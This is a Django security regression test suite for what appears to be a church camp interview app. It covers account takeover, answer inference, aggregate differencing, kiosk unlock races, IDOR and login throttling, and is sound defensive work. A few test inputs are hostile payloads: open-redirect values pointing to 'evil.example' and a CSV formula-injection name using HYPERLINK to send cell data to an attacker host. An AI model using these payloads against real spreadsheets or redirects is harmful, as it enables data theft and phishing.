"""Adversarial security review (2026-10-23). Every test encodes the SECURE expectation.

Written by a refuter pass that first proved each issue with a failing test; the fixes
live in the code and these tests keep them fixed.
"""

from __future__ import annotations

import csv
import io
from datetime import timedelta
from importlib import import_module

from django.conf import settings
from django.contrib.auth.models import User
from django.test import Client, RequestFactory
from django.urls import reverse
from django.utils import timezone
from django.utils.http import url_has_allowed_host_and_scheme

from events.models import (
    Answer,
    EventMembership,
    EventParticipant,
    FollowUp,
    Interview,
    InterviewStatus,
    TutorAssignment,
)
from events.services import interviews as svc
from events.services.metrics import team_scope
from events.services.questionnaire import duplicate_version, options_by_code
from events.services.reports import generate_snapshot

from .base import PASSWORD, CampFixture


class RefuterBase(CampFixture):
    def q(self, code):
        return self.question(code)

    def complete(self, participant, answers=None, decision="no_requerido", texts=None):
        now = timezone.now()
        interview = Interview.objects.create(
            event=self.event, participant=participant, version=self.version, status=Interview.Status.COMPLETED,
            completed_at=now, started_at=now - timedelta(minutes=10), follow_up_decision=decision,
            conducted_by=participant.coordinator.user if participant.coordinator else None,
        )
        for code, values in (answers or {}).items():
            question = self.q(code)
            answer = Answer.objects.create(interview=interview, question=question)
            opts = options_by_code(question)
            answer.options.set([opts[v] for v in values])
        for code, text in (texts or {}).items():
            Answer.objects.create(interview=interview, question=self.q(code), text_value=text)
        participant.interview_status = InterviewStatus.COMPLETED
        participant.save(update_fields=["interview_status"])
        return interview

    def extra_campers(self, n, coordinator=None):
        coordinator = coordinator or self.m_coord1
        start = EventParticipant.objects.filter(event=self.event).count() + 1
        return [
            EventParticipant.objects.create(
                event=self.event, number=start + i, full_name=f"Extra Campero{i} Prueba", age=20, room="9",
                church_group="Centro", coordinator=coordinator,
            )
            for i in range(n)
        ]


# ---- 1. account takeover --------------------------------------------------------------------


class AccountTakeoverTests(RefuterBase):
    def test_event_admin_cannot_take_over_an_existing_superuser_account(self):
        root = User.objects.create_superuser("root@prueba.mx", "root@prueba.mx", PASSWORD)
        self.login(self.admin)
        # Enrolling an existing account in the event is allowed (it keeps its own password)...
        self.client.post(self.url("member_add"), {"full_name": "Quien Sea", "email": "root@prueba.mx", "role": "coordinador"})
        membership = EventMembership.objects.get(event=self.event, user=root)
        # ...but no password-set link can be minted for an account that already has one.
        response = self.client.post(self.url("member_edit", membership.id), {"action": "link"})
        self.assertEqual(response.status_code, 403)
        page = self.client.get(self.url("member_edit", membership.id))
        self.assertIsNone(page.context["link"])
        self.assertContains(page, "¿Olvidaste tu contraseña?")
        self.assertTrue(Client().login(username="root@prueba.mx", password=PASSWORD))

    def test_link_is_allowed_only_for_accounts_created_here_without_password(self):
        self.login(self.admin)
        self.client.post(self.url("member_add"), {"full_name": "Nueva Persona", "email": "nueva@prueba.mx", "role": "coordinador"})
        membership = EventMembership.objects.get(event=self.event, user__email="nueva@prueba.mx")
        response = self.client.post(self.url("member_edit", membership.id), {"action": "link"})
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.context["link"])
        self.assertTrue(self.event.audit_events.filter(summary__startswith="Generó un enlace").exists())

    def test_admin_status_alone_is_not_enough_to_read_confidential_text(self):
        interview = self.complete(self.p1, {"dudas": ["si"]}, texts={"dudas_detalle": "SECRETO-XYZ-789"})
        self.login(self.admin)
        # One POST: the admin grants *themselves* sensitive access (only self-deactivation is blocked).
        self.client.post(self.url("member_add"), {"full_name": "Ada Admin", "email": "admin@prueba.mx", "role": "administrador", "can_view_sensitive": "on"})
        response = self.client.get(self.url("interview_detail", interview.public_id))
        self.assertNotContains(response, "SECRETO-XYZ-789")


# ---- 2. field-level visibility bypassed through conditional questions --------------------------


class ConditionalRowLeakTests(RefuterBase):
    PAIRS = [
        # (parent code, value that shows the child, value that hides it, child code)
        ("decision", ["recibir_cristo"], ["ninguna"], "orientacion"),  # sensible -> sensible
        ("dudas", ["si"], ["no"], "dudas_detalle"),  # sensible -> confidencial
    ]

    def test_hidden_answer_cannot_be_inferred_from_which_rows_are_listed(self):
        for parent, shows, hides, child in self.PAIRS:
            a = self.complete(self.p1, {parent: shows})
            b = self.complete(self.p3, {parent: hides})
            child_text = self.q(child).text
            for user in (self.tutor1, self.pastor):
                with self.subTest(parent=parent, viewer=user.email):
                    self.login(user)
                    page_a = self.client.get(self.url("interview_detail", a.public_id)).content.decode()
                    page_b = self.client.get(self.url("interview_detail", b.public_id)).content.decode()
                    # Control: the parent answer itself IS hidden from this viewer.
                    self.assertNotIn(self.q(parent).options.get(code=shows[0]).label, page_a)
                    self.assertEqual(
                        child_text in page_a, child_text in page_b,
                        f"{user.email} can tell {parent}={shows} from {parent}={hides}: row «{child_text}» appears only for one",
                    )
            Interview.objects.filter(pk__in=[a.pk, b.pk]).delete()


class SupervisedReviewLeakTests(RefuterBase):
    def _kiosk_then_unlock(self, apoyo):
        self.login(self.coord1)
        self.choose_station(number=5)
        self.start(self.p1, mode="supervisada")
        interview = Interview.objects.get(participant=self.p1)
        self.client.post(self.url("interview_handoff", interview.public_id))
        self.answer(interview, "apoyo", apoyo, url_name="kiosk")
        self.client.post(reverse("kiosk:finish"))
        self.client.post(reverse("kiosk:unlock"), {"password": PASSWORD})
        return interview, self.client.get(self.url("interview_review", interview.public_id))

    def test_coordinator_cannot_infer_confidential_answer_from_review_rows(self):
        interview, response = self._kiosk_then_unlock(["sexualidad"])
        self.assertNotContains(response, "Sexualidad")  # control: the label itself is hidden
        self.assertNotContains(
            response, self.q("apoyo_detalle").text,
            msg_prefix="conditional row only exists when the confidential 'apoyo' answer asked for support",
        )

    def test_coordinator_suggestion_does_not_reveal_confidential_answer(self):
        interview, response = self._kiosk_then_unlock(["sexualidad"])
        self.assertNotContains(
            response, "Pidió apoyo en un área de su vida",
            msg_prefix="SUPPORT_REQUESTED is derived only from CONFIDENTIAL questions",
        )


# ---- 3. differencing / homogeneity in privacy-suppressed aggregates ------------------------------


class DifferencingTests(RefuterBase):
    """Aggregates come from released cutoff values: a cell moves only when >= k answers moved."""

    def _snapshot_dudas(self):
        from events.services.metrics import event_scope
        from events.services.reports import visible_payload
        from events.access import resolve_access

        snap = generate_snapshot(self.event, event_scope(self.event), trigger="automatico", cutoff_at=timezone.now())
        outcomes = visible_payload(snap.data, resolve_access(self.pastor, self.event))["outcomes"]
        outcome = next(o for o in outcomes if o["code"] == "dudas")
        return [(r["code"], r["display"]) for r in outcome["rows"]]

    def test_one_campers_answer_does_not_change_released_aggregates(self):
        others = self.extra_campers(7)
        pool = [self.p2, self.p3, self.p4, self.p_minor_no_auth, *others]  # 11 people, X = p1
        for index, person in enumerate(pool):
            self.complete(person, {"dudas": ["si" if index < 7 else "no"]})
        x = self.complete(self.p1, {"dudas": ["si"]})
        world_si = self._snapshot_dudas()
        answer = x.answers.get(question=self.q("dudas"))
        answer.options.set([self.q("dudas").options.get(code="no")])
        world_no = self._snapshot_dudas()
        self.assertEqual(world_si, world_no, "camper X's 'dudas' answer can be read by comparing two cutoffs")

    def test_pastor_dashboard_shows_only_released_aggregates(self):
        for person in (self.p1, self.p2):
            self.complete(person, {"dudas": ["si"]})
        self.login(self.pastor)
        response = self.client.get(self.url("pastor_home"))
        self.assertEqual(response.context["outcomes"], [])  # nothing live, only cutoffs

    def test_deck_follow_up_count_does_not_reveal_one_camper(self):
        from events.services.metrics import event_scope

        for person in (self.p2, self.p3, self.p4, self.p_minor_no_auth):
            interview = self.complete(person, decision="requerido")
            FollowUp.objects.create(event=self.event, participant=person, interview=interview)
        generate_snapshot(self.event, event_scope(self.event), trigger="automatico", cutoff_at=timezone.now() - timedelta(minutes=5))
        x = self.complete(self.p1, decision="requerido")
        FollowUp.objects.create(event=self.event, participant=self.p1, interview=x)
        generate_snapshot(self.event, event_scope(self.event), trigger="automatico", cutoff_at=timezone.now())
        self.login(self.pastor)
        deck = self.client.get(self.url("presentation_live")).context["deck"]
        self.assertEqual(deck["follow_ups"]["requested"]["display"], "Menos de 5", "the 5th request must not be visible on the projector")

    def test_homogeneous_answers_are_not_disclosed(self):
        others = self.extra_campers(5)
        for person in (self.p1, self.p2, self.p3, self.p4, self.p_minor_no_auth, *others):
            self.complete(person, {"dudas": ["si"]})
        rows = dict(self._snapshot_dudas())
        self.assertFalse(
            all(display == "0" for code, display in rows.items() if code != "si"),
            f"every respondent's answer is determined: {rows}",
        )


# ---- 4. kiosk unlock rate limit ------------------------------------------------------------------


class KioskRateLimitRaceTests(RefuterBase):
    def test_parallel_unlock_attempts_are_still_limited(self):
        self.login(self.coord1)
        self.choose_station(number=5)
        self.start(self.p1, mode="supervisada")
        interview = Interview.objects.get(participant=self.p1)
        self.client.post(self.url("interview_handoff", interview.public_id))
        self.client.post(reverse("kiosk:finish"))
        key = self.client.cookies[settings.SESSION_COOKIE_NAME].value
        store_class = import_module(settings.SESSION_ENGINE).SessionStore
        # 10 requests in flight: each loads the session before any of them saves it.
        stores = [store_class(session_key=key) for _ in range(10)]
        for store in stores:
            store.get(svc.KIOSK_KEY)
        evaluated = 0
        for store in stores:
            request = RequestFactory().post("/estacion/desbloquear/")
            request.session = store
            try:
                svc.kiosk_unlock(request, "adivinanza")
            except svc.InterviewError as exc:
                evaluated += exc.message == svc.WRONG_PASSWORD_MESSAGE
            store.save()
        final = store_class(session_key=key)[svc.KIOSK_KEY]
        self.assertLessEqual(
            evaluated, svc.UNLOCK_MAX_ATTEMPTS,
            f"{evaluated} password guesses were checked; stored state afterwards: {final}",
        )


# ---- 5. redirects, exports, scope, robustness ----------------------------------------------------


class RedirectTests(RefuterBase):
    def test_choose_station_does_not_redirect_off_site(self):
        self.login(self.coord1)
        station = self.event.stations.get(number=1)
        response = self.client.post(self.url("choose_station"), {"station": station.id, "siguiente": "//evil.example/robar"})
        self.assertTrue(url_has_allowed_host_and_scheme(response["Location"], {"testserver"}), response["Location"])

    def test_guardian_authorization_does_not_redirect_off_site(self):
        self.login(self.coord1)
        response = self.client.post(self.url("guardian_authorization", self.p_minor_no_auth.public_id), {"siguiente": "/\\evil.example/robar"})
        self.assertTrue(url_has_allowed_host_and_scheme(response["Location"], {"testserver"}), response["Location"])


class ExportTests(RefuterBase):
    def test_csv_export_neutralizes_formulas(self):
        self.login(self.coord1)
        name = '=HYPERLINK("https://evil.example/?x="&A1) Pérez'
        self.client.post(self.url("participant_create"), {"full_name": name, "age": 20, "room": "3", "church_group": "Centro"})
        self.assertTrue(EventParticipant.objects.filter(full_name=name).exists())
        self.login(self.admin)
        body = self.client.get(self.url("participant_export")).content.decode("utf-8-sig")
        cells = [cell for row in csv.reader(io.StringIO(body)) for cell in row]
        self.assertFalse([c for c in cells if c[:1] in ("=", "+", "-", "@")], "formula cell exported verbatim")


class SnapshotScopeTests(RefuterBase):
    def test_tutor_old_snapshot_does_not_show_coordinator_moved_out_of_scope(self):
        snap = generate_snapshot(self.event, team_scope(self.event, self.m_tutor1), trigger="manual", cutoff_at=timezone.now())
        TutorAssignment.objects.filter(coordinator=self.m_coord2).update(tutor=self.m_tutor2)
        self.login(self.tutor1)
        self.assertEqual(self.client.get(self.url("coordinator_detail", self.m_coord2.id)).status_code, 404)  # control
        response = self.client.get(self.url("report_detail", snap.public_id))
        self.assertEqual(response.status_code, 200)
        self.assertNotContains(response, self.coord2.get_full_name())


class RobustnessTests(RefuterBase):
    def test_delete_question_with_foreign_id_is_a_clean_rejection(self):
        draft = duplicate_version(self.version, self.admin)
        self.login(self.admin)
        response = self.client.post(self.url("version_detail", draft.id), {"action": "delete_question", "question": self.q("salvo").id})
        self.assertIn(response.status_code, (302, 404))


# ---- 6. more probes: revoked-session unlock, cutoff minute boundary ------------------------------


class RevokedSessionUnlockTests(RefuterBase):
    def test_unlock_after_revocation_keeps_the_revocation_record(self):
        from events.models import ParticipantSession

        self.login(self.coord1)
        self.choose_station(number=5)
        self.start(self.p1, mode="supervisada")
        interview = Interview.objects.get(participant=self.p1)
        self.client.post(self.url("interview_handoff", interview.public_id))
        admin = Client()
        self.login(self.admin, admin)
        ps = ParticipantSession.objects.get(interview=interview)
        admin.post(self.url("sessions"), {"participant_session": str(ps.public_id)})
        # The unlock form was already on screen: POST it directly (never visiting kiosk:home).
        self.client.post(reverse("kiosk:unlock"), {"password": PASSWORD})
        ps.refresh_from_db()
        self.assertEqual(ps.end_reason, ParticipantSession.EndReason.REVOKED)


class CutoffMinuteBoundaryTests(RefuterBase):
    def test_double_click_across_a_minute_boundary_is_one_cutoff(self):
        from unittest import mock

        from events.models import ReportSnapshot
        from events.services.reports import manual_cutoff
        from events.access import resolve_access

        access = resolve_access(self.pastor, self.event)
        t0 = timezone.now().replace(second=59, microsecond=900000)
        with mock.patch("django.utils.timezone.now", return_value=t0):
            manual_cutoff(access, "evento")
        with mock.patch("django.utils.timezone.now", return_value=t0 + timedelta(milliseconds=200)):
            manual_cutoff(access, "evento")
        self.assertEqual(ReportSnapshot.objects.filter(event=self.event, trigger="manual").count(), 1)


# ---- 7. claims that should HOLD (these passing is evidence, not a finding) ----------------------


class HeldKioskTests(RefuterBase):
    def setUp(self):
        self.login(self.coord1)
        self.choose_station(number=5)
        self.start(self.p1, mode="supervisada")
        self.interview = Interview.objects.get(participant=self.p1)
        self.client.post(self.url("interview_handoff", self.interview.public_id))

    def test_kiosk_post_to_privileged_endpoint_is_confined(self):
        before = Interview.objects.get(pk=self.interview.pk).status
        for url in (
            self.url("interview_review", self.interview.public_id),
            self.url("interview_discard", self.interview.public_id),
            reverse("logout"),
            "/estacion",  # no trailing slash
        ):
            response = self.client.post(url, {"follow_up_decision": "no_requerido", "reason": "repetir", "revision": 0})
            self.assertRedirects(response, reverse("kiosk:home"), fetch_redirect_response=False, msg_prefix=url)
        self.assertEqual(Interview.objects.get(pk=self.interview.pk).status, before)

    def test_finished_kiosk_shows_no_answers_anywhere(self):
        self.answer(self.interview, "dudas", "si", url_name="kiosk", extra={f"q_{self.q('dudas_detalle').id}": "MI-SECRETO-KIOSKO"})
        self.client.post(reverse("kiosk:finish"))
        for url in (reverse("kiosk:home"), reverse("kiosk:review"), reverse("kiosk:step", args=[self.step("dudas").number])):
            response = self.client.get(url, follow=True)
            self.assertNotContains(response, "MI-SECRETO-KIOSKO", msg_prefix=url)
        # POSTing a step after finishing does not save.
        self.answer(self.interview, "salvo", "si", url_name="kiosk")
        self.assertFalse(self.interview.answers.filter(question=self.q("salvo")).exists())

    def test_old_kiosk_cookie_is_dead_after_unlock(self):
        self.client.post(reverse("kiosk:finish"))
        old_key = self.client.cookies[settings.SESSION_COOKIE_NAME].value
        self.client.post(reverse("kiosk:unlock"), {"password": PASSWORD})
        replay = Client()
        replay.cookies[settings.SESSION_COOKIE_NAME] = old_key
        response = replay.get(reverse("kiosk:home"))
        self.assertContains(response, "No hay una entrevista abierta")
        self.assertNotIn("_auth_user_id", replay.session)
        self.assertEqual(replay.get(self.url("coord_home")).status_code, 302)  # to login

    def test_clearing_cookies_does_not_grant_a_fresh_unlock_budget(self):
        self.client.post(reverse("kiosk:finish"))
        fresh = Client()
        response = fresh.post(reverse("kiosk:unlock"), {"password": PASSWORD})
        self.assertContains(response, "No hay una entrevista abierta")
        self.assertNotIn("_auth_user_id", fresh.session)

    def test_same_team_but_unassigned_coordinator_and_tutor_cannot_unlock(self):
        self.client.post(reverse("kiosk:finish"))
        for user in (self.coord2, self.tutor1, self.pastor):
            response = self.client.post(reverse("kiosk:unlock"), {"otra": "1", "username": user.username, "password": PASSWORD})
            self.assertContains(response, "La contraseña no es correcta.", msg_prefix=user.email)
            self.assertIn(svc.KIOSK_KEY, self.client.session)

    def test_take_over_kills_the_kiosk(self):
        other = Client()
        self.login(self.coord1, other)
        other.post(self.url("interview_conflict", self.interview.public_id))
        self.answer(self.interview, "salvo", "si", url_name="kiosk")
        self.assertFalse(self.interview.answers.exists())
        self.assertContains(self.client.get(reverse("kiosk:home")), "No hay una entrevista abierta")


class HeldIdorTests(RefuterBase):
    def test_admin_handlers_reject_other_event_ids(self):
        from events.models import InterviewStation, ParticipantSession

        other_station = InterviewStation.objects.filter(event=self.other_event).first()
        self.login(self.admin)
        self.assertEqual(self.client.get(self.url("member_edit", self.m_other.id)).status_code, 404)
        self.assertEqual(self.client.post(self.url("stations"), {"action": "toggle", "station": other_station.id}).status_code, 404)
        other_tutor = EventMembership.objects.get(event=self.other_event, role="tutor")
        self.client.post(self.url("assignments"), {f"tutor_{self.m_coord1.id}": other_tutor.id})
        self.assertFalse(TutorAssignment.objects.filter(tutor=other_tutor, coordinator__event=self.event).exists())
        other_interview = Interview.objects.create(event=self.other_event, participant=self.p_other_event, version=self.version)
        ps = ParticipantSession.objects.create(
            interview=other_interview, token_hash="x", lock_token_hash="y", started_by=self.other_coord,
            expires_at=timezone.now() + timedelta(minutes=5),
        )
        self.assertEqual(self.client.post(self.url("sessions"), {"participant_session": str(ps.public_id)}).status_code, 404)
        self.assertEqual(self.client.post(self.url("sessions"), {"interview": str(other_interview.public_id)}).status_code, 404)

    def test_tutor_cannot_touch_other_team_follow_up_or_interview(self):
        interview = self.complete(self.p4, {"salvo": ["si"]}, decision="requerido")
        follow_up = FollowUp.objects.create(event=self.event, participant=self.p4, interview=interview)
        self.login(self.tutor1)
        self.assertEqual(self.client.get(self.url("follow_up_detail", follow_up.id)).status_code, 404)
        self.assertEqual(self.client.post(self.url("follow_up_detail", follow_up.id), {"status": "atendido"}).status_code, 404)
        self.assertEqual(self.client.get(self.url("interview_detail", interview.public_id)).status_code, 404)
        self.assertEqual(self.client.get(self.url("safety_report", self.p4.public_id)).status_code, 404)

    def test_pastor_without_sensitive_gets_no_safety_signal_in_reports(self):
        FollowUp.objects.create(event=self.event, participant=self.p1, kind=FollowUp.Kind.SAFETY, details="RIESGO-PDF")
        from events.services.metrics import event_scope

        snap = generate_snapshot(self.event, event_scope(self.event), trigger="manual", cutoff_at=timezone.now())
        self.assertEqual(snap.data["follow_ups"]["safety_open"], 1)
        self.login(self.pastor)
        detail = self.client.get(self.url("report_detail", snap.public_id))
        self.assertIsNone(detail.context["payload"]["follow_ups"]["safety_open"])
        self.assertNotContains(detail, "riesgo abiertas")
        self.assertNotContains(self.client.get(self.url("pastor_home")), "riesgo abiertas")


class AssignmentLostUpdateTests(RefuterBase):
    def test_saving_one_row_does_not_drop_other_coordinators_tutor(self):
        self.login(self.admin)
        # A stale or partial form: only coord1's row, with its CURRENT value (no change intended).
        self.client.post(self.url("assignments"), {f"tutor_{self.m_coord1.id}": self.m_tutor1.id})
        remaining = set(TutorAssignment.objects.filter(event=self.event).values_list("coordinator_id", flat=True))
        self.assertEqual(remaining, {self.m_coord1.id, self.m_coord2.id, self.m_coord3.id})


class FollowUpPrivacyAndThrottleTests(RefuterBase):
    def test_login_is_throttled_per_account(self):
        url = reverse("login")
        for _ in range(8):
            self.client.post(url, {"username": self.coord1.username, "password": "equivocada"})
        response = self.client.post(url, {"username": self.coord1.username, "password": PASSWORD})
        self.assertContains(response, "Demasiados intentos")
        self.assertNotIn("_auth_user_id", self.client.session)
        # Another account is not affected.
        self.assertTrue(Client().login(username=self.coord2.username, password=PASSWORD))

    def test_confidential_support_request_reaches_only_the_care_team(self):
        self.login(self.coord1)
        self.choose_station(number=5)
        self.start(self.p1, mode="supervisada")
        interview = Interview.objects.get(participant=self.p1)
        self.client.post(self.url("interview_handoff", interview.public_id))
        self.answer(interview, "apoyo", ["familia"], url_name="kiosk")
        self.client.post(reverse("kiosk:finish"))
        self.client.post(reverse("kiosk:unlock"), {"password": PASSWORD})
        interview.refresh_from_db()
        self.client.post(self.url("interview_review", interview.public_id), {"revision": interview.revision, "follow_up_decision": "no_requerido"})
        referral = FollowUp.objects.get(interview=interview)
        self.assertTrue(referral.confidential)
        self.assertEqual(referral.reason, FollowUp.Reason.SUPPORT_REQUESTED)
        for user in (self.coord1, self.tutor1, self.pastor, self.admin):
            self.login(user)
            self.assertEqual(self.client.get(self.url("follow_up_detail", referral.id)).status_code, 404, user.email)
            self.assertNotContains(self.client.get(self.url("follow_ups")), self.p1.full_name)
        self.login(self.care)
        self.assertEqual(self.client.get(self.url("follow_up_detail", referral.id)).status_code, 200)

    def test_follow_up_decision_cannot_be_flipped_once_decided(self):
        interview = self.complete(self.p1, decision="no_requerido")
        self.login(self.coord1)
        self.client.post(self.url("interview_detail", interview.public_id), {"action": "decision", "decision": "requerido"})
        interview.refresh_from_db()
        self.assertEqual(interview.follow_up_decision, "no_requerido")
        self.assertFalse(FollowUp.objects.filter(interview=interview).exists())

    def test_malformed_ids_are_404_not_500(self):
        self.login(self.admin)
        self.assertEqual(self.client.post(self.url("sessions"), {"participant_session": "no-es-uuid"}).status_code, 404)
        self.assertEqual(self.client.post(self.url("sessions"), {"interview": "x"}).status_code, 404)

    def test_handback_screen_does_not_name_the_previous_camper(self):
        self.login(self.coord1)
        self.choose_station(number=5)
        self.start(self.p1, mode="supervisada")
        interview = Interview.objects.get(participant=self.p1)
        self.client.post(self.url("interview_handoff", interview.public_id))
        self.client.post(reverse("kiosk:finish"))
        self.assertNotContains(self.client.get(reverse("kiosk:home")), self.p1.first_name)


class SecondReviewTests(RefuterBase):
    """Findings from the documentation pass (code read against the docs)."""

    def _supervised_with_support(self):
        self.login(self.coord1)
        self.choose_station(number=6)
        self.start(self.p1, mode="supervisada")
        interview = Interview.objects.get(participant=self.p1)
        self.client.post(self.url("interview_handoff", interview.public_id))
        self.answer(interview, "apoyo", ["relaciones"], url_name="kiosk")
        self.client.post(reverse("kiosk:finish"))
        self.client.post(reverse("kiosk:unlock"), {"password": PASSWORD})
        interview.refresh_from_db()
        return interview

    def test_done_page_does_not_mention_the_confidential_referral(self):
        interview = self._supervised_with_support()
        response = self.client.post(
            self.url("interview_review", interview.public_id), {"revision": interview.revision, "follow_up_decision": "no_requerido"}, follow=True
        )
        self.assertContains(response, "Entrevista completada")
        self.assertNotContains(response, "Se registró un seguimiento")
        self.assertNotContains(response, "apoyo en un área")

    def test_station_is_remembered_after_recovering_the_computer(self):
        self._supervised_with_support()
        self.assertEqual(self.client.session.get("stations", {}).get(str(self.event.id)), self.event.stations.get(number=6).id)

    def test_resuming_a_never_handed_over_supervised_interview_goes_to_hand_over(self):
        self.login(self.coord1)
        self.choose_station()
        self.start(self.p2, mode="supervisada")
        interview = Interview.objects.get(participant=self.p2)
        response = self.client.get(self.url("interview_resume", interview.public_id))
        self.assertRedirects(response, self.url("interview_handoff", interview.public_id), fetch_redirect_response=False)

    def test_pdf_survives_markup_like_text(self):
        from events.services.metrics import event_scope

        self.m_tutor1.team_name = "Equipo <A> & <b>"
        self.m_tutor1.save()
        self.event.name = "Campamento <Jóvenes>"
        self.event.save()
        snap = generate_snapshot(self.event, event_scope(self.event), trigger="manual", cutoff_at=timezone.now())
        self.login(self.pastor)
        response = self.client.get(self.url("report_pdf", snap.public_id))
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.content.startswith(b"%PDF"))

    def test_deactivated_membership_overrides_church_pastor_role(self):
        from core.models import Role
        from core.services import assign_role
        from events.access import resolve_access

        assign_role(self.pastor, self.church, Role.PASTOR)
        self.assertIsNotNone(resolve_access(self.pastor, self.event))
        self.m_pastor.is_active = False
        self.m_pastor.save()
        self.assertIsNone(resolve_access(self.pastor, self.event))
        self.assertIsNotNone(resolve_access(self.pastor, self.other_event))  # other events of the church still work

    def test_lockouts_escalate_instead_of_resetting(self):
        from unittest import mock

        from events.services import throttle

        now = timezone.now()
        with mock.patch("events.services.throttle.timezone.now", return_value=now):
            results = [throttle.consume("k", limit=3, window_seconds=3600, block_seconds=60) for _ in range(4)]
        self.assertEqual(results, [0, 0, 0, 60])
        later = now + timedelta(seconds=61)
        with mock.patch("events.services.throttle.timezone.now", return_value=later):
            second = [throttle.consume("k", limit=3, window_seconds=3600, block_seconds=60) for _ in range(3)]
        self.assertEqual(second[-1], 120, second)  # fewer tries after a block, and a longer block

    def test_dashboard_auto_refresh_does_not_keep_a_session_alive(self):
        import time

        self.login(self.pastor)
        self.client.get(self.url("pastor_home"))
        session = self.client.session
        session["last_seen"] = int(time.time()) - 3600
        session.save()
        response = self.client.get(self.url("pastor_home"), HTTP_X_REQUESTED_WITH="fetch")
        self.assertEqual(response.status_code, 302)
        self.assertIn(reverse("login"), response["Location"])


class ThirdReviewTests(RefuterBase):
    def test_removed_pastor_is_not_sent_to_the_event(self):
        from core.models import Role
        from core.services import assign_role
        from events.access import accessible_events

        assign_role(self.pastor, self.church, Role.PASTOR)
        self.m_pastor.is_active = False
        self.m_pastor.save()
        self.assertNotIn(self.event, accessible_events(self.pastor))
        self.assertIn(self.other_event, accessible_events(self.pastor))

    def test_throttle_fails_closed_when_the_counter_cannot_be_written(self):
        from unittest import mock

        from django.db import IntegrityError
        from events.services import throttle

        with mock.patch("events.models.AuthThrottle.objects.select_for_update", side_effect=IntegrityError):
            self.assertEqual(throttle.consume("x", limit=5, window_seconds=60, block_seconds=60), 60)

    def test_old_waiting_kiosk_stops_accepting_unlocks(self):
        from django.core.management import call_command
        from events.models import ParticipantSession

        self.login(self.coord1)
        self.choose_station()
        self.start(self.p1, mode="supervisada")
        interview = Interview.objects.get(participant=self.p1)
        self.client.post(self.url("interview_handoff", interview.public_id))
        self.client.post(reverse("kiosk:finish"))
        ParticipantSession.objects.filter(interview=interview).update(created_at=timezone.now() - timedelta(hours=4))
        call_command("run_report_cutoffs", verbosity=0)
        self.client.post(reverse("kiosk:unlock"), {"password": PASSWORD})
        self.assertNotIn("_auth_user_id", self.client.session)
        self.assertContains(self.client.get(reverse("kiosk:home")), "No hay una entrevista abierta")
